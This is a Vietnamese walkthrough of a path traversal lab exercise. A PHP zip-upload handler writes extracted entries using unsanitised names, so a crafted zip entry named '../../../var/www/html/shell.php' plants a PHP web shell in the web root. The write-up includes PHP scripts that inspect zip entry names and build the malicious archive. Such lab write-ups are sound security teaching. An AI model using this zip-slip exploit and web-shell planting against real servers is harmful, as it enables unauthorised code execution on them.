# PATH_TRAVERSAL level 06 

Đây là một trang web cho phép upload một file nén, file này sau đó sẽ được giải nén và được upload tuần tự lên server. Ở đây phần tạo directory riêng có lẽ các bạn đã quen rồi, mình sẽ đi thẳng vào phần xử lý

```
if(isset($_FILES["file"]) ) {
    try {

      $file_name = $_FILES["file"]["name"];
      if(substr($file_name,-4,4) == ".zip")
      {
        $result = _unzip_file_ziparchive($_FILES["file"]["tmp_name"],$dir);
      }
      else
      {
        $newFile = $dir . "/" . $file_name;
        move_uploaded_file($_FILES["file"]["tmp_name"], $newFile);
      }

   } catch(Exception $e) {
        $error = $e->getMessage();
     }
}
```

Phần code trên sẽ kiểm tra xem file upload có phải file zip không, nếu phải thì nó sẽ tiến hành giải nén, nếu không thì sẽ cho upload thẳng lên server. 

Hàm `_unzip_file_ziparchive` dùng để giải nén file đến thư mục đã tạo, sau khi giải nén sẽ thực hiện `file_put_contents` để ghi nội dung file vừa giải nén ra một file.

Trong file `apache2.conf` cũng có đoạn code chặn thực thi php trong thư mục `/usr/upload`, đoán lờ ngợ là mục tiêu của ta là dùng path traversal để ghi ra một directory bên ngoài `/usr/upload`

## Vấn đề

Ở phần code upload file không phải zip, có thể bạn sẽ nghĩ `$_FILES["file"]["name"]` là một untrust data nên ta có thể chèn `../` vào tên file để ghi ra đường dẫn `/var/www/html` như bài 3, tuy nhiên cơ chế upload file của php đã tự động remove đi các kí tự này nên ta sẽ không thể upload file bằng cách này.

![](https://i.imgur.com/AnvIxtv.png)

![](https://i.imgur.com/jnoIJ5g.png)


Vậy giờ ta phải tìm cách để làm sao đó từ việc upload file zip có thể upload được file shell??? 🤔

Khoan nghĩ đã, ta cùng đọc tiếp xem bên trong `_unzip_file_ziparchive` có gì. 


## Ý tưởng

Đầu tiên là gọi method `open` trong class `ZipArchive` để đọc file zip, tiếp là lặp qua hết các file, gặp folder thì bỏ qua. Nếu gặp file thì lấy nội dung của file đó rồi ghi vào đường dẫn đã tạo + tên file
```
if(file_exists(dirname($to . "/" . $info['name']))){ // directory exists
    file_put_contents($to . "/" . $info['name'], $contents);
}
```

Ủa khoan, từ từ nha. Tìm hiểu về `statIndex` trên trang chủ, nó là phương thức để lấy info về một file trong file zip sau đó trả về ở dạng array:

![](https://i.imgur.com/KQsZruE.png)

Nhìn vào ảnh thì thấy nó không bỏ đi ký tự `/`, vậy còn cụm `../` thì sao, thử tạo file zip và nén 1 file với tên `../../../var/www/html/shell.php` sau đó dùng đoạn code này để test:

```
<?php 
$z = new ZipArchive();
$zopen = $z->open("test.zip", ZipArchive::CHECKCONS);
$info = $z->statIndex($i);
var_dump($info);
?>
```

![](https://i.imgur.com/uzPzHxA.png)

À há, không hề bị remove. Đây chính là lỗ hổng zip slip mà ta được học qua, giờ công việc còn lại khá đơn giản, tạo một file php với tên như trên rồi chèn script php vào thôi, cùng thử nha.

## Tấn công

Dùng code php để tạo file zip:

```
<?php

$zip = new ZipArchive();
$filename = "./test.zip";

if ($zip->open($filename, ZipArchive::CREATE)!==TRUE) {
    exit("cannot open <$filename>\n");
}

$zip->addFromString("../../../var/www/html/shell.php", "<?php echo `` ?>");
$zip->close();
?>
```

Chạy file này ta thu được file zip, upload file zip này lên:

![](https://i.imgur.com/GeXgUJ6.png)

Truy cập thử vào `/shell.php`:

![](https://i.imgur.com/2empfo9.png)

Vậy là ta đã xong bài lab!
